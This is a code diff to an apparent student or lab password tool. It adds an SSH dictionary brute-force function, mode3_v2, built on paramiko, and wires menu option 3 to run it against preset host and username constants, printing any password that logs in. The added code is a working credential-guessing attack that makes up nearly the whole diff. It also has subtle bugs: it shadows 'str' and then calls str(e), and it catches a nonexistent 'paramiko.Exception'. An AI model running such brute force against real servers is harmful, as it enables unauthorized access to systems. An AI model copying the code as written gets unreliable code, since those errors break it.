@@ -55,10 +55,36 @@ def mode3(hostname, username, password, port):
         print(f"Error: {str(e)}")
     except:
         print("\n ----- Something went wrong -----\n")
+        
+# Function name: mode3_v2
+# Purpose      : Takes a worlist to brute force a SSH connection
+# Arguments    : hostname, username, wordlist, port
+# Return       : none        
+def mode3_v2(hostname, username, wordlist, port):
+    ssh = paramiko.SSHClient()
+    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+    
+    with open(wordlist, 'r') as wordlist:
+        wordlist = wordlist.read().splitlines()
+        
+    for str in wordlist:
+        try:
+            ssh.connect(hostname=hostname, port=port, username=username, password=str, timeout=3)
+            print(f"Successful login with password: {str}")
+
+            ssh.close()
+            break
+        except paramiko.AuthenticationException:
+            print(f"Failed login attempt with password: {str}")
+        except paramiko.SSHException as e:
+            print(f"SSH Exception: {str(e)}")
+        except paramiko.Exception as e:
+            print(f"Error: {str(e)}")
+        except:
+            print("\n ----- Something went wrong -----\n")
 
     
 def main(): 
-
     while(True):
         
         user_input = input("\n\n---> Select one of the modes (1,2,3 or q):\n\nMode 1: Offensive; Dictionary Iterator\nMode 2: Defensive; Password Recognized\nMode 3: Authenticate to an SSH server by its IP address\nMode q: Quit\n\n>")
@@ -72,7 +98,10 @@ def main():
                 wordlist = input("\nEnter the path to the wordlist:\n\n>")
                 mode2(string,wordlist)
             case "3":
-                mode3(HOSTNAME, USERNAME, PASSWORD, PORT)
+                # mode3(HOSTNAME, USERNAME, PASSWORD, PORT)
+                
+                wordlist = input("\nEnter the path to the wordlist:\n\n>")
+                mode3_v2(HOSTNAME, USERNAME, wordlist, PORT)
             case "q":
                 print("\nQuitting...")
                 break
